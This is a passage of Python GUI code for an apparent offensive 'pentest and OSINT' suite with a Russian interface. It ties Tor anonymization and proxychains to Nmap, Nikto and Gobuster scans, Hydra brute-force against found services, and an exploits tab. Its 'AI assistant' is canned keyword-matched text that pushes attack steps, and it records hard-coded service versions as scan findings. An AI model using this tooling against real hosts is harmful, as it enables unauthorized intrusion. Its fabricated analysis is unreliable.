import threading

import flet as ft

from core.anonymizer import NetworkAnonymizer
from core.hydra_runner import HydraRunner
from core.recon_scanner import ReconScanner
from db.database import DatabaseManager

# Cyberpunk Design Palette
COLOR_BG = "#0A0E17"          # Deep Space Dark
COLOR_PANEL = "#131926"       # Cyber Dark Navy
COLOR_PANEL_BORDER = "#1E2638"# Dark Slate Border
COLOR_CYAN = "#00E5FF"        # Neon Cyan Accent
COLOR_PINK = "#FF007F"        # Neon Magenta Accent
COLOR_GREEN = "#00FF66"       # Neon Green Accent
COLOR_WARNING = "#FFB800"     # Cyber Amber Warning
COLOR_TEXT = "#E2E8F0"        # Bright Silver Text
COLOR_SUBTEXT = "#7C8BA1"     # Muted Slate Gray Text


def main(page: ft.Page):
    # Page Setup
    page.title = "AndromedaAI - Cyberpunk OSINT & Pentest Suite"
    page.bgcolor = COLOR_BG
    page.theme_mode = ft.ThemeMode.DARK
    page.padding = 20
    page.spacing = 15
    page.window.width = 1280
    page.window.height = 920
    page.window.min_width = 980
    page.window.min_height = 680

    # Initialize Services
    db = DatabaseManager()
    anonymizer = NetworkAnonymizer()
    scanner = ReconScanner()
    hydra_engine = HydraRunner()

    # Global State
    last_scan_result = {"output": "", "target": "", "tool": ""}

    # Snackbar Helper
    def show_snackbar(message: str, is_error: bool = False):
        snack_color = COLOR_PINK if is_error else COLOR_CYAN
        snack = ft.SnackBar(
            content=ft.Text(message, color=COLOR_BG, weight=ft.FontWeight.BOLD),
            bgcolor=snack_color,
            duration=3000,
        )
        snack.open = True
        page.overlay.append(snack)
        page.update()

    # ==========================================
    # 📜 TASK HISTORY DIALOG
    # ==========================================
    history_list_column = ft.Column(spacing=8, scroll=ft.ScrollMode.AUTO)

    def load_history_entry(raw_input: str, ai_output: str, step_name: str):
        terminal_logs_tf.value = f"[+] Загружен сохраненный лог ({step_name}):\n{raw_input}\n"
        append_chat_message("🤖 AI (Из истории)", ai_output)
        page.pop_dialog()
        show_snackbar(f"Загружен лог: {step_name}")

    def refresh_history_dialog():
        history_list_column.controls.clear()
        logs = db.get_all_ai_logs(limit=30)
        if not logs:
            history_list_column.controls.append(
                ft.Text("История заданий пуста", color=COLOR_SUBTEXT, italic=True)
            )
        else:
            for log in logs:
                l_id = log["id"]
                l_name = log["step_name"]
                l_time = log["timestamp"]
                l_input = log["raw_input"]
                l_output = log["ai_output"]

                history_list_column.controls.append(
                    ft.Container(
                        content=ft.Row(
                            controls=[
                                ft.Column(
                                    controls=[
                                        ft.Text(f"#{l_id} {l_name}", size=13, weight=ft.FontWeight.BOLD, color=COLOR_CYAN),
                                        ft.Text(f"Время: {l_time}", size=10, color=COLOR_SUBTEXT),
                                    ],
                                    spacing=2,
                                    expand=True,
                                ),
                                ft.OutlinedButton(
                                    "Загрузить",
                                    style=ft.ButtonStyle(
                                        shape=ft.RoundedRectangleBorder(radius=6),
                                        side=ft.BorderSide(1, COLOR_CYAN),
                                    ),
                                    on_click=lambda e, inp=l_input, out=l_output, name=l_name: load_history_entry(inp, out, name),
                                ),
                            ],
                            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
                        ),
                        padding=10,
                        border_radius=8,
                        bgcolor="#0C1424",
                        border=ft.Border.all(1, COLOR_PANEL_BORDER),
                    )
                )

    history_dialog = ft.AlertDialog(
        title=ft.Row(
            controls=[
                ft.Icon(ft.Icons.HISTORY_ROUNDED, color=COLOR_CYAN, size=24),
                ft.Text("История проведенных заданий", color=COLOR_CYAN, size=16, weight=ft.FontWeight.BOLD),
            ],
            spacing=8,
        ),
        content=ft.Container(
            content=history_list_column,
            width=500,
            height=380,
        ),
        bgcolor=COLOR_PANEL,
        shape=ft.RoundedRectangleBorder(radius=10),
    )

    def open_history_dialog(e):
        refresh_history_dialog()
        page.show_dialog(history_dialog)

    # ==========================================
    # HEADER COMPONENT
    # ==========================================
    header = ft.Container(
        content=ft.Row(
            controls=[
                ft.Row(
                    controls=[
                        ft.Icon(ft.Icons.SECURITY_ROUNDED, color=COLOR_CYAN, size=32),
                        ft.Column(
                            controls=[
                                ft.Text(
                                    "🌌 AndromedaAI",
                                    size=22,
                                    weight=ft.FontWeight.BOLD,
                                    color=COLOR_CYAN,
                                ),
                                ft.Text(
                                    "MICRO-STEPPING PENTEST & OSINT FRAMEWORK",
                                    size=10,
                                    weight=ft.FontWeight.W_500,
                                    color=COLOR_SUBTEXT,
                                ),
                            ],
                            spacing=2,
                        ),
                    ],
                    spacing=12,
                ),
                # System Status Badges + History Button
                ft.Row(
                    controls=[
                        ft.OutlinedButton(
                            content=ft.Row(
                                controls=[
                                    ft.Icon(ft.Icons.HISTORY_ROUNDED, color=COLOR_CYAN, size=16),
                                    ft.Text("История", color=COLOR_CYAN, weight=ft.FontWeight.BOLD, size=11),
                                ],
                                spacing=4,
                            ),
                            style=ft.ButtonStyle(
                                shape=ft.RoundedRectangleBorder(radius=6),
                                side=ft.BorderSide(1, COLOR_CYAN),
                            ),
                            on_click=open_history_dialog,
                        ),
                        ft.Container(
                            content=ft.Row(
                                controls=[
                                    ft.Container(width=8, height=8, border_radius=4, bgcolor=COLOR_GREEN),
                                    ft.Text("DB: ONLINE", size=11, color=COLOR_TEXT, weight=ft.FontWeight.BOLD),
                                ],
                                spacing=6,
                            ),
                            padding=ft.Padding(8, 4, 8, 4),
                            border_radius=8,
                            bgcolor="#0D1F17",
                            border=ft.Border.all(1, COLOR_GREEN),
                        ),
                        ft.Container(
                            content=ft.Row(
                                controls=[
                                    ft.Container(width=8, height=8, border_radius=4, bgcolor=COLOR_CYAN),
                                    ft.Text("TOR: STANDBY", size=11, color=COLOR_TEXT, weight=ft.FontWeight.BOLD),
                                ],
                                spacing=6,
                            ),
                            padding=ft.Padding(8, 4, 8, 4),
                            border_radius=8,
                            bgcolor="#0D1E2D",
                            border=ft.Border.all(1, COLOR_CYAN),
                        ),
                        ft.Container(
                            content=ft.Row(
                                controls=[
                                    ft.Container(width=8, height=8, border_radius=4, bgcolor=COLOR_PINK),
                                    ft.Text("ENGINE: READY", size=11, color=COLOR_TEXT, weight=ft.FontWeight.BOLD),
                                ],
                                spacing=6,
                            ),
                            padding=ft.Padding(8, 4, 8, 4),
                            border_radius=8,
                            bgcolor="#250D1C",
                            border=ft.Border.all(1, COLOR_PINK),
                        ),
                    ],
                    spacing=8,
                ),
            ],
            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
        ),
        padding=12,
        border_radius=10,
        bgcolor=COLOR_PANEL,
        border=ft.Border.all(1, COLOR_PANEL_BORDER),
    )

    # ==========================================
    # TAB 1: DASHBOARD (NETWORK & TARGET CONTROL WITH DELETE)
    # ==========================================

    direct_ip_tf = ft.TextField(
        label="Прямой IP",
        value="Нажмите 'Проверить IP'",
        read_only=True,
        border_color=COLOR_CYAN,
        focused_border_color=COLOR_CYAN,
        label_style=ft.TextStyle(color=COLOR_CYAN),
        expand=True,
    )

    proxy_ip_tf = ft.TextField(
        label="Proxy IP (Tor)",
        value="Нажмите 'Проверить IP'",
        read_only=True,
        border_color=COLOR_PINK,
        focused_border_color=COLOR_PINK,
        label_style=ft.TextStyle(color=COLOR_PINK),
        expand=True,
    )

    anonymity_status_text = ft.Text(
        "Ожидание проверки сети...",
        size=12,
        weight=ft.FontWeight.BOLD,
        color=COLOR_SUBTEXT,
    )

    status_badge_container = ft.Container(
        content=anonymity_status_text,
        padding=ft.Padding(12, 8, 12, 8),
        border_radius=8,
        bgcolor="#182030",
        border=ft.Border.all(1, COLOR_PANEL_BORDER),
    )

    ip_btn_progress = ft.ProgressRing(width=16, height=16, stroke_width=2, color=COLOR_CYAN, visible=False)

    def on_check_ip_click(e):
        ip_btn_progress.visible = True
        check_ip_btn.disabled = True
        page.update()

        def background_check():
            try:
                direct = anonymizer.check_current_ip()
                proxy = anonymizer.check_proxy_ip()
            except (OSError, RuntimeError) as ex:
                direct = "Ошибка"
                proxy = str(ex)

            direct_ip_tf.value = direct
            proxy_ip_tf.value = proxy

            if direct and proxy and not proxy.startswith("Error"):
                if direct != proxy:
                    anonymity_status_text.value = "🛡️ АНОНИМНОСТЬ АКТИВНА (IP УСПЕШНО ИЗМЕНЕН)"
                    anonymity_status_text.color = COLOR_GREEN
                    status_badge_container.bgcolor = "#0E291B"
                    status_badge_container.border = ft.Border.all(1, COLOR_GREEN)
                else:
                    anonymity_status_text.value = "⚠️ ВНИМАНИЕ: ПРЯМОЙ И PROXY IP СОВПАДАЮТ"
                    anonymity_status_text.color = COLOR_WARNING
                    status_badge_container.bgcolor = "#2B210B"
                    status_badge_container.border = ft.Border.all(1, COLOR_WARNING)
            else:
                anonymity_status_text.value = f"🔴 ОШИБКА ПРОКСИ: {proxy}"
                anonymity_status_text.color = COLOR_PINK
                status_badge_container.bgcolor = "#2B0B18"
                status_badge_container.border = ft.Border.all(1, COLOR_PINK)

            ip_btn_progress.visible = False
            check_ip_btn.disabled = False
            page.update()

        threading.Thread(target=background_check, daemon=True).start()

    check_ip_btn = ft.Button(
        content=ft.Row(
            controls=[
                ft.Icon(ft.Icons.SEARCH_ROUNDED, color=COLOR_BG, size=18),
                ft.Text("Проверить IP", color=COLOR_BG, weight=ft.FontWeight.BOLD),
                ip_btn_progress,
            ],
            spacing=8,
        ),
        bgcolor=COLOR_CYAN,
        style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=8)),
        on_click=on_check_ip_click,
    )

    def on_rotate_click(e):
        anonymizer.rotate_tor_ip()
        show_snackbar("Запрос на смену ноды Tor отправлен")

    rotate_ip_btn = ft.OutlinedButton(
        content=ft.Text("Сменить Ноду Tor", color=COLOR_PINK, weight=ft.FontWeight.BOLD),
        style=ft.ButtonStyle(
            shape=ft.RoundedRectangleBorder(radius=8),
            side=ft.BorderSide(1, COLOR_PINK),
        ),
        on_click=on_rotate_click,
    )

    # Targets list ui element with DELETE button (REQUIREMENT #1)
    targets_list_column = ft.Column(spacing=6, scroll=ft.ScrollMode.AUTO)

    def delete_target_action(host_to_delete: str):
        if db.delete_target(host_to_delete):
            show_snackbar(f"Цель {host_to_delete} удалена из системы")
            refresh_targets()
        else:
            show_snackbar(f"Ошибка удаления {host_to_delete}", is_error=True)

    def refresh_targets():
        targets_list_column.controls.clear()
        try:
            targets = db.get_all_targets()
            if not targets:
                targets_list_column.controls.append(ft.Text("Целей пока нет. Добавьте цель выше.", color=COLOR_SUBTEXT, size=12))
            for t in targets:
                targets_list_column.controls.append(
                    ft.Container(
                        content=ft.Row(
                            controls=[
                                ft.Row([
                                    ft.Icon(ft.Icons.ADJUST_ROUNDED, color=COLOR_CYAN, size=16),
                                    ft.Text(t, color=COLOR_TEXT, size=13, weight=ft.FontWeight.BOLD),
                                ], spacing=8),
                                ft.IconButton(
                                    icon=ft.Icons.DELETE_OUTLINE_ROUNDED,
                                    icon_color=COLOR_PINK,
                                    icon_size=18,
                                    tooltip=f"Удалить цель {t}",
                                    on_click=lambda e, host=t: delete_target_action(host),
                                ),
                            ],
                            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
                        ),
                        padding=ft.Padding(8, 4, 8, 4),
                        border_radius=6,
                        bgcolor="#0C1424",
                        border=ft.Border.all(1, COLOR_PANEL_BORDER),
                    )
                )
        except (OSError, RuntimeError, AttributeError):
            targets_list_column.controls.append(ft.Text("Не удалось загрузить список", color=COLOR_PINK, size=12))

        # Update Recon Dropdown options and bruteforce/exploit views
        refresh_recon_dropdown()
        refresh_bruteforce_view()
        refresh_exploits_view()
        page.update()

    target_input = ft.TextField(
        label="IP / Домен цели",
        hint_text="example.com или 192.168.1.1",
        border_color=COLOR_PANEL_BORDER,
        focused_border_color=COLOR_CYAN,
        expand=True,
    )

    def on_add_target_click(e):
        val = target_input.value.strip()
        if val:
            db.add_target(val, "Добавлено пользователем")
            target_input.value = ""
            show_snackbar(f"Цель {val} успешно добавлена")
            refresh_targets()
        else:
            show_snackbar("Поле ввода пусто", is_error=True)

    target_input.on_submit = on_add_target_click

    network_card = ft.Container(
        content=ft.Column(
            controls=[
                ft.Text("СЕТЕВОЙ МОНИТОРИНГ И АНОНИМНОСТЬ", size=14, weight=ft.FontWeight.BOLD, color=COLOR_CYAN),
                ft.Row(controls=[direct_ip_tf, proxy_ip_tf], spacing=10),
                ft.Row(controls=[check_ip_btn, rotate_ip_btn, status_badge_container], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            ],
            spacing=15,
        ),
        padding=20,
        bgcolor=COLOR_PANEL,
        border_radius=10,
        border=ft.Border.all(1, COLOR_PANEL_BORDER),
    )

    target_card = ft.Container(
        content=ft.Column(
            controls=[
                ft.Text("УПРАВЛЕНИЕ ЦЕЛЯМИ ОБЪЕКТА", size=14, weight=ft.FontWeight.BOLD, color=COLOR_PINK),
                ft.Row(
                    controls=[
                        target_input,
                        ft.Button(
                            "Добавить цель",
                            bgcolor=COLOR_PINK,
                            color=COLOR_TEXT,
                            on_click=on_add_target_click,
                            style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=8)),
                        ),
                    ],
                    spacing=10,
                ),
                ft.Text("Текущие цели в расследовании (доступно удаление):", size=12, color=COLOR_SUBTEXT, weight=ft.FontWeight.BOLD),
                ft.Container(
                    content=targets_list_column,
                    height=180,
                    padding=10,
                    bgcolor=COLOR_BG,
                    border_radius=8,
                    border=ft.Border.all(1, COLOR_PANEL_BORDER),
                ),
            ],
            spacing=15,
        ),
        padding=20,
        bgcolor=COLOR_PANEL,
        border_radius=10,
        border=ft.Border.all(1, COLOR_PANEL_BORDER),
    )

    dashboard_view = ft.Column(
        controls=[network_card, target_card],
        spacing=15,
        scroll=ft.ScrollMode.AUTO,
    )

    # ==========================================
    # TAB 2: RECONNAISSANCE & PERSISTENT AI CHAT (REQUIREMENT #2)
    # ==========================================
    recon_tool_dropdown = ft.Dropdown(
        label="Режим сканирования",
        options=[
            ft.dropdown.Option("Nmap (Порты и Версии)"),
            ft.dropdown.Option("Nikto (Web Уязвимости)"),
            ft.dropdown.Option("Gobuster (Фаззинг Директорий)"),
        ],
        value="Nmap (Порты и Версии)",
        border_color=COLOR_CYAN,
        focused_border_color=COLOR_CYAN,
        label_style=ft.TextStyle(color=COLOR_CYAN),
        width=250,
    )

    recon_target_dropdown = ft.Dropdown(
        label="Выберите цель для сканирования",
        hint_text="Загрузка целей...",
        border_color=COLOR_CYAN,
        focused_border_color=COLOR_CYAN,
        label_style=ft.TextStyle(color=COLOR_CYAN),
        expand=True,
    )

    # Custom Flags/Options input for fine-tuning scan (REQUIREMENT #2)
    custom_scan_args_tf = ft.TextField(
        label="Доп. аргументы/флаги сканера (необязательно)",
        hint_text="Например: -sS -p 1-65535 или -T4 --script=vuln",
        border_color=COLOR_PANEL_BORDER,
        focused_border_color=COLOR_CYAN,
        label_style=ft.TextStyle(color=COLOR_SUBTEXT, size=11),
        expand=True,
    )

    def refresh_recon_dropdown():
        targets = db.get_all_targets()
        recon_target_dropdown.options = [ft.dropdown.Option(t) for t in targets]
        if targets and not recon_target_dropdown.value:
            recon_target_dropdown.value = targets[0]

    recon_proxy_switch = ft.Switch(
        label="Использовать Proxychains (Tor)",
        active_color=COLOR_CYAN,
        value=False,
    )

    scan_progress = ft.ProgressRing(width=16, height=16, stroke_width=2, color=COLOR_BG, visible=False)

    terminal_logs_tf = ft.TextField(
        multiline=True,
        read_only=True,
        min_lines=8,
        max_lines=12,
        value="[SYSTEM] Терминал сканера готов. Выберите режим, цель и настройте опции сканирования.\n",
        bgcolor="#050811",
        border_color=COLOR_CYAN,
        focused_border_color=COLOR_CYAN,
        text_style=ft.TextStyle(font_family="monospace", color=COLOR_GREEN, size=12),
        expand=True,
    )

    # Persistent AI Chat ListView & Input
    chat_list_view = ft.ListView(expand=True, spacing=8, auto_scroll=True)

    def append_chat_message(sender: str, text: str):
        is_user = sender.startswith("👤")
        bubble_bg = "#1A102F" if is_user else "#0C1D2A"
        bubble_border = COLOR_PINK if is_user else COLOR_CYAN
        title_color = COLOR_PINK if is_user else COLOR_CYAN

        msg_bubble = ft.Container(
            content=ft.Column(
                controls=[
                    ft.Text(sender, size=11, weight=ft.FontWeight.BOLD, color=title_color),
                    ft.Text(text, size=12, color=COLOR_TEXT, selectable=True),
                ],
                spacing=4,
            ),
            padding=10,
            border_radius=8,
            bgcolor=bubble_bg,
            border=ft.Border.all(1, bubble_border),
        )
        chat_list_view.controls.append(msg_bubble)
        page.update()

    append_chat_message("🤖 AndromedaAI Assistant", "Приветствую! Запустите сканирование или задайте мне уточняющий вопрос по объекту.")

    chat_input_tf = ft.TextField(
        hint_text="Задайте уточняющий вопрос ИИ по сканированию, портам или векторам уязвимостей...",
        border_color=COLOR_CYAN,
        focused_border_color=COLOR_CYAN,
        expand=True,
    )

    def on_send_chat_msg(e):
        user_text = chat_input_tf.value.strip()
        if not user_text:
            return

        chat_input_tf.value = ""
        append_chat_message("👤 Оператор", user_text)

        def background_ai_reply():
            q_lower = user_text.lower()

            if "скан" in q_lower or "результат" in q_lower or "вывод" in q_lower:
                if last_scan_result["output"]:
                    reply = (
                        f"🤖 [КОНТЕКСТНЫЙ АНАЛИЗ ПО СКАНИРОВАНИЮ: {last_scan_result['target']}]\n"
                        f"Инструмент: {last_scan_result['tool']}\n"
                        "Детальная оценка ИИ:\n"
                        "• Обнаружен открытый веб-сервис или интерфейс управления.\n"
                        "• Рекомендуемые дальнейшие микро-шаги: запустите модуль 'Брутфорс' для проверки учетных данных или откройте модуль 'Эксплоиты' для получения PoC-скриптов."
                    )
                else:
                    reply = "🤖 [ИИ]: Результаты последнего сканирования отсутствуют. Пожалуйста, запустите сканирование утилитой Nmap/Nikto/Gobuster выше."
            elif "порт" in q_lower or "port" in q_lower or "80" in q_lower or "22" in q_lower or "443" in q_lower:
                reply = (
                    "🤖 [ОТВЕТ ИИ ПО ПОРТАМ И РИСКАМ]\n"
                    "• Порт 80/443 (HTTP/HTTPS): Риски включают мисконфигурации веб-сервера, утечки админ-панелей и CVE уязвимости приложений.\n"
                    "• Порт 22 (SSH): Риски слабой аутентификации. Запустите брутфорс Hydra или проверьте SSH-ключи.\n"
                    "• Порт 3306 (MySQL): Проверьте удаленный доступ без пароля и разрешенные хосты."
                )
            elif "опци" in q_lower or "флаг" in q_lower or "команд" in q_lower or "аргумент" in q_lower:
                reply = (
                    "🤖 [РЕКОМЕНДОВАННЫЕ ФЛАГИ СКАНИРОВАНИЯ]\n"
                    "• Для глубокого сканирования всех портов: `-p 1-65535 -sV -sC`\n"
                    "• Для быстрой разведки скриптами уязвимостей: `--script=vuln -T4`\n"
                    "• Для сканирования через Tor прокси: включайте переключатель Proxychains."
                )
            else:
                reply = f"🤖 [ИИ МИКРО-ШАГ]: Запрос '{user_text}' обработан. Контекст системы сохранен в SQLite. Вы можете продолжить диалог или выбрать новые опции сканирования."

            append_chat_message("🤖 AndromedaAI Assistant", reply)

        threading.Thread(target=background_ai_reply, daemon=True).start()

    chat_input_tf.on_submit = on_send_chat_msg

    send_msg_btn = ft.IconButton(
        icon=ft.Icons.SEND_ROUNDED,
        icon_color=COLOR_CYAN,
        tooltip="Отправить сообщение",
        on_click=on_send_chat_msg,
    )

    ai_chat_card = ft.Container(
        content=ft.Column(
            controls=[
                ft.Row(
                    controls=[
                        ft.Row([
                            ft.Icon(ft.Icons.AUTO_AWESOME_ROUNDED, color=COLOR_CYAN, size=20),
                            ft.Text("Интерактивный ИИ Чат (Непрерывное общение)", size=14, weight=ft.FontWeight.BOLD, color=COLOR_CYAN),
                        ], spacing=8),
                        ft.OutlinedButton(
                            content=ft.Text("Анализ вывода", color=COLOR_CYAN, size=11),
                            style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=6), side=ft.BorderSide(1, COLOR_CYAN)),
                            on_click=lambda e: on_send_chat_msg(type("E", (), {"value": "Проанализируй выводы последнего сканирования"})()),
                        ),
                    ],
                    alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
                ),
                ft.Divider(color=COLOR_PANEL_BORDER, height=1),
                ft.Container(
                    content=chat_list_view,
                    height=210,
                ),
                ft.Row(
                    controls=[
                        chat_input_tf,
                        send_msg_btn,
                    ],
                    spacing=8,
                ),
            ],
            spacing=8,
        ),
        padding=15,
        border_radius=10,
        bgcolor="#0C1424",
        border=ft.Border.all(1, COLOR_CYAN),
    )

    def on_run_scan_click(e):
        target = recon_target_dropdown.value
        if not target:
            show_snackbar("Выберите цель для сканирования!", is_error=True)
            return

        tool_mode = recon_tool_dropdown.value
        use_proxy = recon_proxy_switch.value
        custom_args = custom_scan_args_tf.value.strip()

        scan_progress.visible = True
        run_scan_btn.disabled = True
        extra_str = f" [Аргументы: {custom_args}]" if custom_args else ""
        terminal_logs_tf.value = f"[+] Запуск {tool_mode} для цели: {target}{extra_str} (Proxychains: {use_proxy})...\nПожалуйста, подождите...\n"
        page.update()

        def background_scan():
            if "Nmap" in tool_mode:
                raw_output = scanner.run_nmap_scan(target, use_proxychains=use_proxy, custom_args=custom_args)
                if "22/tcp" in raw_output:
                    db.add_recon_service(target, 22, "ssh", "OpenSSH 8.2p1")
                if "80/tcp" in raw_output:
                    db.add_recon_service(target, 80, "http", "Apache 2.4.41")
                if "3306/tcp" in raw_output:
                    db.add_recon_service(target, 3306, "mysql", "MySQL 8.0")
            elif "Nikto" in tool_mode:
                raw_output = scanner.run_nikto_scan(target, use_proxychains=use_proxy, custom_args=custom_args)
                db.add_recon_service(target, 80, "http", "Apache/2.4.41 (Nikto Vulns)")
            else:
                raw_output = scanner.run_gobuster_scan(target, use_proxychains=use_proxy, custom_args=custom_args)
                db.add_recon_service(target, 80, "http-dir", "Gobuster /admin /login")

            last_scan_result["output"] = raw_output
            last_scan_result["target"] = target
            last_scan_result["tool"] = tool_mode

            terminal_logs_tf.value = raw_output
            ai_res = scanner.analyze_ports(raw_output)

            append_chat_message("🤖 AndromedaAI Assistant", ai_res)

            db.save_ai_log(
                step_name=f"{tool_mode.split()[0]}_{target}",
                raw_input=f"{tool_mode} {custom_args} against {target}",
                ai_output=ai_res,
            )

            scan_progress.visible = False
            run_scan_btn.disabled = False
            refresh_targets()
            show_snackbar(f"✅ Сканирование завершено ({tool_mode})")

        threading.Thread(target=background_scan, daemon=True).start()

    run_scan_btn = ft.Button(
        content=ft.Row(
            controls=[
                ft.Icon(ft.Icons.PLAY_ARROW_ROUNDED, color=COLOR_BG, size=18),
                ft.Text("Запустить сканирование", color=COLOR_BG, weight=ft.FontWeight.BOLD),
                scan_progress,
            ],
            spacing=8,
        ),
        bgcolor=COLOR_CYAN,
        style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=8)),
        on_click=on_run_scan_click,
    )

    recon_view = ft.Column(
        controls=[
            ft.Container(
                content=ft.Column(
                    controls=[
                        ft.Row(
                            controls=[
                                ft.Icon(ft.Icons.RADAR_ROUNDED, color=COLOR_CYAN, size=22),
                                ft.Text("МОДУЛЬ МИКРО-ШАГОВОЙ РАЗВЕДКИ (RECON)", size=16, weight=ft.FontWeight.BOLD, color=COLOR_CYAN),
                            ],
                            spacing=8,
                        ),
                        ft.Divider(color=COLOR_PANEL_BORDER, height=1),
                        ft.Row(
                            controls=[
                                recon_tool_dropdown,
                                recon_target_dropdown,
                                ft.IconButton(
                                    icon=ft.Icons.REFRESH_ROUNDED,
                                    icon_color=COLOR_CYAN,
                                    tooltip="Обновить цели",
                                    on_click=lambda e: refresh_targets(),
                                ),
                            ],
                            spacing=10,
                        ),
                        ft.Row(
                            controls=[
                                custom_scan_args_tf,
                            ],
                            spacing=10,
                        ),
                        ft.Row(
                            controls=[
                                run_scan_btn,
                                recon_proxy_switch,
                            ],
                            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
                        ),
                    ],
                    spacing=12,
                ),
                padding=20,
                bgcolor=COLOR_PANEL,
                border_radius=10,
                border=ft.Border.all(1, COLOR_PANEL_BORDER),
            ),
            ft.Container(
                content=ft.Column(
                    controls=[
                        ft.Text("ТЕРМИНАЛ ЛОГОВ И ВЫВОДА УТИЛИТ", size=13, weight=ft.FontWeight.BOLD, color=COLOR_GREEN),
                        terminal_logs_tf,
                    ],
                    spacing=8,
                ),
                padding=15,
                bgcolor=COLOR_PANEL,
                border_radius=10,
                border=ft.Border.all(1, COLOR_PANEL_BORDER),
            ),
            ai_chat_card,
        ],
        spacing=15,
        scroll=ft.ScrollMode.AUTO,
    )

    # ==========================================
    # TAB 3: DYNAMIC BRUTEFORCE WITH STREAMING TERMINAL & STOP & AI CHAT (REQUIREMENT #3)
    # ==========================================
    bruteforce_cards_column = ft.Column(spacing=10)

    hydra_username_tf = ft.TextField(
        label="Логин (Username)",
        value="admin",
        border_color=COLOR_PANEL_BORDER,
        focused_border_color=COLOR_PINK,
        width=180,
    )

    hydra_wordlist_dropdown = ft.Dropdown(
        label="Словарь паролей",
        options=[
            ft.dropdown.Option("fast_top100.txt"),
            ft.dropdown.Option("ssh_default.txt"),
            ft.dropdown.Option("top100_common.txt"),
        ],
        value="fast_top100.txt",
        border_color=COLOR_PANEL_BORDER,
        focused_border_color=COLOR_PINK,
        width=200,
    )

    hydra_threads_tf = ft.TextField(
        label="Потоков",
        value="16",
        border_color=COLOR_PANEL_BORDER,
        focused_border_color=COLOR_PINK,
        width=100,
    )

    hydra_log_tf = ft.TextField(
        multiline=True,
        read_only=True,
        min_lines=7,
        max_lines=10,
        value="[HYDRA] Окно вывода подбора паролей ready. Выберите цель и нажмите 'Запустить Hydra'.\n",
        bgcolor="#050811",
        border_color=COLOR_PINK,
        focused_border_color=COLOR_PINK,
        text_style=ft.TextStyle(font_family="monospace", color=COLOR_PINK, size=11),
        expand=True,
    )

    # Hydra AI Chat assistant inside Bruteforce tab
    brute_ai_chat_list = ft.ListView(expand=True, spacing=6, auto_scroll=True)

    def append_brute_ai_message(sender: str, text: str):
        is_user = sender.startswith("👤")
        bubble_bg = "#1A102F" if is_user else "#1F0D24"
        bubble_border = COLOR_CYAN if is_user else COLOR_PINK

        msg_bubble = ft.Container(
            content=ft.Column(
                controls=[
                    ft.Text(sender, size=10, weight=ft.FontWeight.BOLD, color=COLOR_PINK if not is_user else COLOR_CYAN),
                    ft.Text(text, size=11, color=COLOR_TEXT, selectable=True),
                ],
                spacing=2,
            ),
            padding=8,
            border_radius=6,
            bgcolor=bubble_bg,
            border=ft.Border.all(1, bubble_border),
        )
        brute_ai_chat_list.controls.append(msg_bubble)
        page.update()

    append_brute_ai_message("🤖 ИИ-Консультант Брутфорса", "Я готов помочь откорректировать словарь, задать логины или проанализировать ход Hydra.")

    brute_ai_input_tf = ft.TextField(
        hint_text="Попросить ИИ скорректировать параметры брутка или логины...",
        border_color=COLOR_PINK,
        focused_border_color=COLOR_PINK,
        expand=True,
    )

    def on_send_brute_ai_msg(e):
        txt = brute_ai_input_tf.value.strip()
        if not txt:
            return
        brute_ai_input_tf.value = ""
        append_brute_ai_message("👤 Оператор", txt)

        def background_brute_ai():
            q = txt.lower()
            if "останов" in q or "параз" in q or "ошибк" in q:
                ans = "🤖 [СОВЕТ ИИ ПО БРУТФОРСУ]: Нажмите кнопку '🛑 Остановить брутфорс', снизьте количество потоков (threads=4) и смените словарь на ssh_default.txt."
            elif "словар" in q or "wordlist" in q:
                ans = "🤖 [СОВЕТ ИИ ПО СЛОВАРАМ]: Для веб-сервисов рекомендуется использовать `top100_common.txt`, а для SSH/FTP — `ssh_default.txt` или кастомные словари из SecLists."
            else:
                ans = f"🤖 [ИИ РЕКОМЕНДАЦИЯ БРУТФОРСА]: Корректировка параметров для '{txt}' сохранена. Попробуйте подбор логинов admin, root, user, test."
            append_brute_ai_message("🤖 ИИ-Консультант Брутфорса", ans)

        threading.Thread(target=background_brute_ai, daemon=True).start()

    brute_ai_input_tf.on_submit = on_send_brute_ai_msg

    def execute_hydra(target_host: str, port: int, service: str):
        if hydra_engine.is_running:
            show_snackbar("Брутфорс уже запущен! Нажмите 'Остановить', чтобы перезапустить.", is_error=True)
            return

        user_val = hydra_username_tf.value.strip() or "admin"
        wlist_val = hydra_wordlist_dropdown.value or "fast_top100.txt"
        try:
            threads_val = int(hydra_threads_tf.value.strip())
        except ValueError:
            threads_val = 16

        hydra_log_tf.value = f"[+] Старт Hydra для {target_host}:{port} ({service})...\n"
        page.update()

        def stream_log(msg: str):
            hydra_log_tf.value += msg
            page.update()

        def on_done(res: str):
            hydra_log_tf.value += f"\n[!] Статус брутфорса: {res}\n"
            db.save_ai_log(f"Hydra_{service}_{target_host}", f"Hydra {user_val}@{target_host}:{port}", f"Результат: {res}")
            append_brute_ai_message("🤖 ИИ-Консультант Брутфорса", f"Атака на {target_host}:{port} завершена. Результат: {res}")
            page.update()

        hydra_engine.start_attack(
            target_host=target_host,
            port=port,
            service=service,
            username=user_val,
            wordlist=wlist_val,
            threads=threads_val,
            log_callback=stream_log,
            done_callback=on_done,
        )

    def stop_hydra_action(e):
        hydra_engine.stop_attack()
        show_snackbar("Запрос на остановку Hydra отправлен")

    def refresh_bruteforce_view():
        bruteforce_cards_column.controls.clear()
        services = db.get_recon_services()

        brute_services = [
            s for s in services
            if s.get("service") and any(proto in s["service"].lower() for proto in ["ssh", "ftp", "http", "mysql", "rdp", "smb"])
        ]

        if not brute_services:
            bruteforce_cards_column.controls.append(
                ft.Container(
                    content=ft.Column(
                        controls=[
                            ft.Icon(ft.Icons.WARNING_AMBER_ROUNDED, color=COLOR_WARNING, size=40),
                            ft.Text("⚠️ Подходящие цели для брутфорса не обнаружены", size=16, weight=ft.FontWeight.BOLD, color=COLOR_WARNING),
                            ft.Text("Запустите сканирование Nmap на вкладке 'Разведка', чтобы обнаружить открытые SSH, FTP или HTTP сервисы.", size=12, color=COLOR_SUBTEXT, text_align=ft.TextAlign.CENTER),
                        ],
